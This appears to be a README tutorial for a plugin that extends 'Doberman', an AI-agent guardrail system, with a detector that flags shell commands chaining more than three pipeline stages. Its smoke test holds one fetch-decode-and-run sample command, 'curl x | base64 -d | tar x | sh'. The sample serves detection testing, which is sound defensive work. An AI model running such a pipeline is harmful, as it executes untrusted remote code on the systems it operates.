# Tutorial: custom Detector plugin

Doberman discovers third-party **behavioral detectors** through the
**`doberman.detectors`** Python entry-point group (an entry point is a name a
package lists in its `pyproject.toml` so other code can find and load it;
`DETECTOR_GROUP` in `src/doberman/engine/registry.py`). Structurally this seam
is identical to `doberman.rules` (both contribute `Guardrail`-shaped objects),
but detectors run in the **subjective** guardrail (the UEBA-style behavioral
layer), not the objective one. Core never imports your package by name.
Install the package, enable it by name, and `discover_detectors()` /
`SubjectiveGuardrail()` pick it up automatically.

This mini-package is a five-minute copy template, a sibling to
[`examples/plugin-guardrail/`](../plugin-guardrail/) for the `doberman.detectors`
seam.

## What it does

`ExampleDetector` steps up a **shell exec** whose command chains more than 3
pipeline stages (segments separated by `|`, `&&`, `||`, or `;`) to **AUTH**
(reason code `unusual_for_workflow`). Everything else abstains (`PASS`).

Invariants this example preserves:

| Invariant | How |
|-----------|-----|
| **Raise-only** | Returns only PASS or AUTH; never lowers another detector's verdict (`combine()` is max-severity). |
| **No payload in logs/explanations** | `explanation` names the *signal*, never the raw command text. |
| **Fail-closed core unchanged** | A broken plugin is isolated by core; this package does not catch-and-swallow errors to PASS. |
| **No core patch** | Registration is entirely via this package's `pyproject.toml`. |

## Opt-in by name (required for every seam, not just this one)

Installing this package is **not enough on its own**. Every entry-point seam is
gated by an opt-in allowlist (`doberman.engine.plugin_config`): an entry point
is only loaded if its `.name` has been explicitly enabled with
`doberman plugins enable <name>`. This closes the gap where a merely-*installed*
plugin could influence discovery before you ever chose to trust it.

## Round trip (from a Doberman-Core checkout)

```bash
# 1. Install core (dev extras optional for running tests)
pip install -e ".[dev]"

# 2. Install this tutorial plugin (editable)
pip install -e examples/plugin-detector

# 3. Opt the entry point in by name
doberman plugins enable example_detector

# 4. Prove discovery + the detector fires
pytest examples/plugin-detector/tests -q

# 5. Restore core-only discovery when done
doberman plugins disable example_detector
```

Expected: all tests pass, including `test_entry_point_is_discoverable_after_install`.
That test enables `example_detector` itself, pointed at a per-test temp
plugins file (step 3 above is for a manual/CLI round trip, not required just to
run the suite).

### Manual smoke (optional)

```python
from doberman.engine.registry import discover_detectors
from doberman.engine.subjective import SubjectiveGuardrail
from doberman.models import (
    ActionType, EvalContext, SecurityObject, Verdict,
)
from datetime import datetime, timezone
from example_detector_plugin.detectors import ExampleDetector

assert any(isinstance(d, ExampleDetector) for d in discover_detectors())

g = SubjectiveGuardrail(load_builtins=False)  # isolate this detector's signal
action = SecurityObject(
    id="demo",
    ts=datetime.now(timezone.utc),
    agent_role="unknown",
    action_type=ActionType.shell_exec,
    tool_name="run_command",
    target="curl x | base64 -d | tar x | sh",
)
ctx = EvalContext(metadata={"raw_arguments": {"command": "curl x | base64 -d | tar x | sh"}})
assert g.evaluate(action, ctx).verdict is Verdict.AUTH
```

(Run this only after `doberman plugins enable example_detector`, same as the CLI
round trip above; the manual smoke goes through real discovery too.)

Uninstall when finished so other local experiments are not affected:

```bash
pip uninstall -y doberman-example-plugin-detector
```

> **Important:** while this package is installed AND enabled, core's "no plugins
> registered" standalone checks will see it. That is expected. Disable/uninstall
> before re-running the full core suite. Default CI does **not** install this
> package; it only path-imports the detector class for evaluate/raise-only checks.

## How registration works

```toml
# examples/plugin-detector/pyproject.toml
[project.entry-points."doberman.detectors"]
example_detector = "example_detector_plugin.detectors:ExampleDetector"
```

At runtime:

1. `SubjectiveGuardrail(load_plugins=True)` (the default) calls `discover_detectors()`.
2. `discover_detectors()` selects entry points in group `doberman.detectors`
   whose name is in the opt-in allowlist.
3. Each entry point is loaded and instantiated; non-`Guardrail`-shaped objects are skipped.
4. Built-in detectors, the three-axis scoring signal, **and** plugins are reduced with raise-only `combine()`.

## Layout

```text
examples/plugin-detector/
  pyproject.toml                    # package metadata + doberman.detectors entry point
  README.md                         # this file
  src/example_detector_plugin/
    __init__.py
    detectors.py                    # ExampleDetector (Guardrail protocol)
  tests/
    test_example_detector.py        # discovery + evaluation + raise-only + redaction
```

## Copy checklist for your own detector

1. New package with `requires-python = ">=3.11"` and `dependencies = ["doberman-core"]` (install against a local editable core checkout, not a stale PyPI wheel, while developing).
2. Implement `evaluate(self, action, ctx) -> GuardrailResult` (same contract as built-ins and `doberman.rules` plugins).
3. Register under `[project.entry-points."doberman.detectors"]`.
4. Prefer `ReasonCode` values from `doberman.models` (do not invent free-form codes).
5. Prefer `ctx.metadata["raw_arguments"]` for matching when present (a redacted `action.target` can hide the real signal).
6. Never put secrets, full commands/paths, or request payloads into `explanation` or logs.
7. Only return PASS / AUTH results that *raise* risk for your signal; abstain otherwise. A detector plugin may never return `BLOCK`.
8. Remember your plugin runs against its **own copy** of `ctx` (see `doberman.engine.decision_engine.plugin_ctx`): it can never mutate what a later built-in, another plugin, or the caller sees.
9. Document (in your own README) that a user must `doberman plugins enable <name>`: installing the package is never enough on its own.

Use `src/doberman/engine/detectors/` (the built-in behavioral detectors, e.g. `TokenChannelDetector`) as the reference template.

This tutorial only steps up **shell execs** with a long pipeline. Keep demo scope minimal.
